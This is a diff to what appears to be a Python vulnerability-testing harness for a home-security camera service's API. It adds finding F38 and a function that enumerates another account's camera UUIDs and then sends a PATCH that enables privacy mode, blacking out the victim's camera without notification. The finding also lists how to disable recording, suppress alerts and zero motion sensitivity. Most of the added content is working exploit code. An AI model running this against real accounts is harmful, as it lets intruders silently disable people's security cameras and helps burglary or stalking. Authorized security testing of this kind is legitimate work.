@@ -377,6 +377,27 @@ FINDINGS = [
                   'Test: obtain own clipId via GET recording list; '
                   'attempt DELETE /v1/recordings/{different_account_clipId} with own token; '
                   '200/204 = CRITICAL. Determine if clipId is sequential or timestamp by examining own clip IDs.'),
+    Finding("F38", "CRITICAL", "Camera Settings IDOR — Enable Privacy Mode (Blackout) on Victim Camera",
+            "app_hub", "/v1/cameras/{uuid}/settings", "PATCH", None,
+            verified=False,
+            notes='APK: SsAppHubRestService.java, CameraSettings.java (classes14.dex). '
+                  'PATCH /v1/cameras/{uuid}/settings body: CameraSettings partial update. '
+                  'CameraSettings fields: privacyEnable (bool), canRecord (bool), notificationsEnable (bool), '
+                  'pirEnable (bool — PIR motion sensor), motionSensitivity (long), micEnable (bool), '
+                  'nightVision (SsSettingsValue), motion (CameraSettingsMotion), alarmState, admin. '
+                  'GET /v1/cameras/{uuid} returns current settings; '
+                  'GET /v1/subscriptions/{sid}/cameras returns camera list including UUIDs. '
+                  'IDOR chain (each step independently proveable): '
+                  '(1) GET /v1/subscriptions/{victim_sid}/cameras -> camera UUID list. '
+                  '(2) PATCH /v1/cameras/{victim_uuid}/settings {"privacyEnable": true} -> camera blackout. '
+                  'Impact: disables victim camera completely — no recording, no live view, no motion detection. '
+                  'Silent: no push notification for camera settings changes in standard flow. '
+                  'Additional write options: canRecord=false (disable recording only), '
+                  'notificationsEnable=false (suppress all camera alerts), '
+                  'motionSensitivity=0 (minimum sensitivity — misses intruders). '
+                  'Camera UUID: likely a device UUID from pairing; readable via GET IDOR on subscription cameras. '
+                  'Test: GET /v1/subscriptions/{victim_sid}/cameras with own token; 200+uuid = enumeration CRITICAL. '
+                  'PATCH /v1/cameras/{victim_uuid}/settings {"privacyEnable":true}; 200 = settings write CRITICAL.'),
 ]
 
 
@@ -405,6 +426,15 @@ def post(url, token=None, body=None, **kw):
     try:
         r = req.post(url, impersonate="chrome120", timeout=8,
                      headers=_session(token), json=body, **kw)
+        return r
+    except Exception as e:
+        return None
+
+
+def patch(url, token=None, **kw):
+    try:
+        r = req.patch(url, impersonate="chrome120", timeout=8,
+                      headers=_session(token), **kw)
         return r
     except Exception as e:
         return None
@@ -1153,6 +1183,41 @@ def test_wifi_credentials_idor(token, victim_serial, victim_sid):
             _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
     else:
         _print("INFO", r.status_code, f"wifiCredentials: {r.text[:100]}")
+
+
+def test_camera_settings_idor(token, victim_sid, victim_camera_uuid=None):
+    """F38: Enumerate cameras via sid IDOR + enable privacy mode (blackout) on victim camera."""
+    print(f"\n=== F38 — Camera Settings IDOR (sid={victim_sid}) ===")
+    # Step 1: enumerate cameras to get UUID
+    r = get(f"{SERVICES['app_hub']}/v1/subscriptions/{victim_sid}/cameras", token=token)
+    uuids = []
+    if r and r.status_code == 200:
+        try:
+            data = r.json()
+            cams = data if isinstance(data, list) else data.get("cameras", []) or data.get("items", [])
+            for c in cams:
+                uuid = c.get("uuid") or c.get("id")
+                uuids.append(uuid)
+                _print("CRIT", 200,
+                       f"CAMERA ENUM sid={victim_sid} uuid={uuid} name={c.get('cameraName',c.get('name','?'))}")
+        except Exception as e:
+            _print("CRIT", 200, f"200 (parse err: {e}) raw={r.text[:200]}")
+    else:
+        _print("INFO", r.status_code if r else 0,
+               f"cameras/{victim_sid}: {r.text[:80] if r else 'no response'}")
+    target_uuid = victim_camera_uuid or (uuids[0] if uuids else None)
+    if not target_uuid:
+        print("  No UUID to test settings write"); return
+    # Step 2: enable privacy mode
+    r2 = get(f"{SERVICES['app_hub']}/v1/cameras/{target_uuid}", token=token)
+    if r2 and r2.status_code == 200:
+        _print("CRIT", 200, f"CAMERA GET uuid={target_uuid} settings={r2.text[:200]}")
+    r3 = patch(f"{SERVICES['app_hub']}/v1/cameras/{target_uuid}/settings",
+               token=token, json={"privacyEnable": True})
+    if r3 and r3.status_code in (200, 201, 204):
+        _print("CRIT", r3.status_code, f"PRIVACY MODE ENABLED uuid={target_uuid}")
+    elif r3:
+        _print("INFO", r3.status_code, f"settings patch: {r3.text[:100]}")
 
 
 def test_recording_deletion_idor(token, victim_clip_id):
